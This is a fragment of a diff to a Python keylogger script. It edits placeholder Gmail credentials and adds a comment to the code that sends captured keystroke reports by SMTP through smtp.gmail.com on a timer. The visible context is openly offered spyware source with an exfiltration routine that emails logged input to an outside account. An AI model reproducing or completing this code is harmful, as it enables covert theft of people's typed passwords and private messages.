@@ -7,7 +7,7 @@ from threading import Semaphore, Timer
 
 SEND_REPORT_EVERY = 30  # 10 minutes
 
-EMAIL_ADDRESS = "<email@gmail.com>"
+EMAIL_ADDRESS = "<yourgmailid>"
 EMAIL_PASSWORD = "<your password>"
 
 
@@ -47,7 +47,7 @@ class Keylogger:
 
     def sendmail(self, email, password, message):
         # manages a connection to an SMTP server
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587) # this is gmail host and port
         # connect to the SMTP server as TLS mode ( for security )
         server.starttls()
         # login to the email account
